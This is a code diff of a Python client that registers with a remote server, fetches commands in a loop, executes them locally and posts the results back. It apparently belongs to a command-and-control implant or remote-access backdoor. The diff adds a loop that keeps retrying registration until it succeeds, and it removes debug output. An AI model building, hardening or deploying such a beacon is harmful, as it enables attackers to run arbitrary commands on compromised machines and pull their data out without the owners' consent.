@@ -36,25 +36,24 @@ def execute_command(cmd):
 
 def main():
     global CLIENT_ID
-    try:
-        CLIENT_ID = register()
-        # print("!!!!!!!!!!CLIENT ID:", CLIENT_ID)
-        while True:
-            cmd = get_command()
-            if not cmd:
-                time.sleep(5)
-                continue
-            if cmd == "disconnect":
-                print(f"client {CLIENT_ID} disconnected")
-                requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'}) # this works too
-                break
-            result = execute_command(cmd)
-            requests.post(SERVER_URL, json={"result": result}, params={'client_id': CLIENT_ID, 'status': 'connected'}) # this goes hard
-            # print("hi from client")
-            time.sleep(10)
-    except Exception as e:
-        print("*crickets*")
-        print(e)
+    while CLIENT_ID is None:
+        try:
+            CLIENT_ID = register()
+        except Exception as e:
+            time.sleep(7)
+
+    while True:
+        cmd = get_command()
+        if not cmd:
+            time.sleep(5)
+            continue
+        if cmd == "disconnect":
+            print(f"client {CLIENT_ID} disconnected")
+            requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'})
+            break
+        result = execute_command(cmd)
+        requests.post(SERVER_URL, json={"result": result}, params={'client_id': CLIENT_ID, 'status': 'connected'}) # this goes hard
+        time.sleep(10)
 
 if __name__ == "__main__":
     main()
